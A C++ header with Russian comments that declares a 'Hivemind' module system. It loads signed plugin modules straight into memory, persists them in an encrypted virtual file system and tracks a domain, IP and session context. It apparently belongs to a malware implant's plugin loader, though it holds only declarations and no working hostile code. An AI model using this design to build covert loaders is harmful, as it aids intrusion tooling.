#pragma once

#include "global.hpp"
#include "..\..\common\module_data.hpp"
#include "evfs.hpp"
#include "DllLoader.h"
#include "strings.hpp"
#include "configreader.h"
#include "module_api.h"

extern "C"
{
#include "crypto\ed25519\ed25519.h"
}

class IModuleSystem
{
public:
	virtual ~IModuleSystem() = default;

	// инициализирует модульную систему
	virtual BOOL init() = 0;
	// загружает сохраненные модули
	virtual BOOL load_persistent() = 0;
	// загружает резидентный модуль в память
	virtual BOOL load_resident(blob *pblResidentBufferBlob, BOOL bSaveModule) = 0;
	// загружает нерезидентный модуль в память
	virtual BOOL load_nonresident(blob *pblNonresidentBufferBlob) = 0;
	// сохраняет резидентный модуль в постоянную память
	virtual BOOL save_resident(blob *pblResidentBufferBlob) = 0;
	// обновляет статус модульной системы, lpAdditionalParameter - доп параметр обновления, зависит от конкретной реализации
	virtual BOOL set_status(DWORD dwStatus, LPBYTE lpAdditionalParameter) = 0;
	// возвращает TRUE если инициализировано
	virtual BOOL is_initialized() = 0;
	virtual UINT get_amount() = 0;
	virtual IEncryptedVirtualFS *get_vfs_ptr() = 0;
};

struct HivemindContextData
{
	PWCHAR pwDomain;
	PWCHAR pwIP;
	PWCHAR pwSessionJson;
};

class HivemindModuleSystem : public IModuleSystem
{
public:
	HivemindModuleSystem();
	~HivemindModuleSystem();

	// инициализирует VFS и аллоцирует буффер с контекстом
	BOOL init();
	// итерирует по VFS и загружает актуальные модули
	BOOL load_persistent();
	// загружает резидентный модуль в память, проверяя также его Ed25519 цифровую подпись, если bSaveModule - TRUE, то сохраняет его в vfs
	BOOL load_resident(blob *pblResidentBufferBlob, BOOL bSaveModule);
	// загружает нерезидентный модуль в память
	BOOL load_nonresident(blob *pblNonresidentBufferBlob);
	// сохраняет резидентный модуль в VFS
	BOOL save_resident(blob *pblResidentBufferBlob);
	// обновляет статус модульной системы, в lpAdditionalParameter - HivemindContextData
	// dwStatus - это module_data::msystem_status_t
	// если lpAdditionalParameter == nullptr, то массивы pwDomain и pwIP обнуляются
	// если статус - MODULESYSTEM_NETWORK_PENDING, то массивы pwDomain и pwIP также обнуляются, а lpAdditionalParameter игнорируется
	BOOL set_status(DWORD dwStatus, LPBYTE lpAdditionalParameter);
	BOOL is_initialized();
	// количество загруженных модулей
	UINT get_amount();
	// возаращает экземпляр evfs
	IEncryptedVirtualFS *get_vfs_ptr();
private:
	// загружает модуль в память
	BOOL load_module_blob(LPBYTE lpModuleBuffer, DWORD dwFileName);
	// освободит список модулей
	VOID free_modulelist();
	// добавит еще один модуль в список
	VOID add_modulelist(HMEMORYMODULE hModule, DWORD dwFileName);
	// TRUE если модуль с именем dwFileName уже загружен
	BOOL is_moduleinlist(DWORD dwFileName);
	VOID lock_ctx();
	VOID unlock_ctx();
	
	// буффер с контекстом для использования в модулях
	// аллоцируется в новую память, потому что требуется постоянное нахождение в памяти без освобождения после разрушения модульной системы
	module_data::msys_context *ctx;
	IEncryptedVirtualFS *evfs;

	BOOL bInitialized;

	loader_functions loader_ctx;
	module_data::hivemind_modulelist *mlist;
	
};

